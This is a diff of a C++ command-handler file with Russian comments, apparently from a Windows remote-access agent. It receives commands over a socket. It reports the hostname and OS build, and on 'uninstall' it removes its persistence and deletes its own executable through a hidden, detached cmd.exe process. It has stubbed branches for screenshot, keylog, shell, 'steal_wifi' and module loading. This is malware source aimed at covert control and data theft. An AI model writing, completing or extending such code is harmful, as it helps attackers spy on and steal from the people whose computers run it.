@@ -1,11 +1,10 @@
-// Core/commands.cpp (ФИНАЛЬНЫЙ — Защита + Win11 Logic)
+// Core/commands.cpp
 #include "commands.h"
 #include "persistence.h"
 #include <windows.h>
 #include <stdio.h>
 #include <string>
 #include <cstring>
-#include <iostream> // Для std::exception
 
 // Структура для RtlGetVersion
 typedef struct _MY_OSVERSIONINFOW {
@@ -19,34 +18,13 @@ typedef struct _MY_OSVERSIONINFOW {
 
 typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);
 
-static void run_hidden(const char* cmd) {
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    char cmdBuf[1024];
-    strcpy_s(cmdBuf, cmd);
-
-    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-}
-
 std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
-    // Логируем вход
     OutputDebugStringA("[CMD] Received: ");
     OutputDebugStringA(cmd.c_str());
     OutputDebugStringA("\n");
 
-    // ОБЁРТКА: Любая ошибка внутри команды будет поймана здесь, 
-    // чтобы агент не падал, а просто возвращал ошибку.
     try {
-        if (cmd == "ping") {
-            return "pong";
-        } 
+        if (cmd == "ping") return "pong";
         else if (cmd == "info") {
             char host[MAX_COMPUTERNAME_LENGTH + 1];
             DWORD s = sizeof(host);
@@ -67,8 +45,6 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
                 }
             }
             
-            // Логика отображения Windows 11
-            // Ядро 10.0, но Build >= 22000 — это Windows 11
             std::string os_name = "Windows";
             if (major == 10 && build >= 22000) os_name = "Windows 11";
             else if (major == 10) os_name = "Windows 10";
@@ -78,41 +54,64 @@ std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
             sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
             return std::string(buf);
         } 
+
         else if (cmd == "uninstall") {
             OutputDebugStringA("[CMD] Executing uninstall sequence...\n");
+            
+            // 1. Удаление персистенс
             uninstall_persistence();
             
+            // 2. Самоудаление файла
             char path[MAX_PATH];
             if (GetModuleFileNameA(NULL, path, MAX_PATH) > 0) {
+                // Используем / для путей в cmd, чтобы избежать проблем с кавычками
+                // ping -n 5 = ~4 секунды задержки
+                // attrib -r -s -h снимает все атрибуты защиты
+                // del /f /q форсированное тихое удаление
                 char del_cmd[1024];
-                sprintf_s(del_cmd, "cmd.exe /c timeout /t 2 /nobreak >nul && del /f /q \"%s\"", path);
-                run_hidden(del_cmd);
+                sprintf_s(del_cmd, 
+                    "cmd.exe /c ping 127.0.0.1 -n 5 >nul && attrib -r -s -h \"%s\" && del /f /q \"%s\"", 
+                    path, path);
+                
+                OutputDebugStringA("[CMD] Self-delete command: ");
+                OutputDebugStringA(del_cmd);
+                OutputDebugStringA("\n");
+                
+                STARTUPINFOA si = { sizeof(si) };
+                PROCESS_INFORMATION pi = { 0 };
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                
+                BOOL created = CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE, 
+                                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+                
+                if (created) {
+                    OutputDebugStringA("[CMD] Self-delete process created.\n");
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                } else {
+                    DWORD err = GetLastError();
+                    char err_log[128];
+                    sprintf_s(err_log, "[CMD] CreateProcess failed! Error: %lu\n", err);
+                    OutputDebugStringA(err_log);
+                }
             }
+            
+            // 3. Мгновенное завершение
             if (sock != INVALID_SOCKET) closesocket(sock);
             OutputDebugStringA("[CMD] Process terminating.\n");
             ExitProcess(0);
         }
-        else if (cmd.find("screenshot") != std::string::npos) {
-            return "SCREENSHOT_DISABLED: module not loaded";
-        }
-        else if (cmd.find("keylog") != std::string::npos) {
-            return "KEYLOG_DISABLED";
-        }
-        else if (cmd.find("shell") != std::string::npos) {
-            return "SHELL_DISABLED";
-        }
-        else if (cmd.find("steal_wifi") != std::string::npos) {
-            return "STEAL_DISABLED";
-        }
-        else if (cmd.find("load_module") != std::string::npos) {
-            return "LOAD_MODULE_DISABLED: will be implemented later";
-        }
+        else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
+        else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
+        else if (cmd.find("shell") != std::string::npos) return "SHELL_DISABLED";
+        else if (cmd.find("steal_wifi") != std::string::npos) return "STEAL_DISABLED";
+        else if (cmd.find("load_module") != std::string::npos) return "LOAD_MODULE_DISABLED";
         
         return "UNKNOWN_COMMAND";
     } 
     catch (...) {
-        // Если что-то упало — возвращаем ошибку, но НЕ умираем
-        OutputDebugStringA("[CMD] Exception caught during command execution!\n");
-        return "INTERNAL_ERROR: Command handler crashed safely";
+        OutputDebugStringA("[CMD] Exception caught!\n");
+        return "INTERNAL_ERROR";
     }
 }
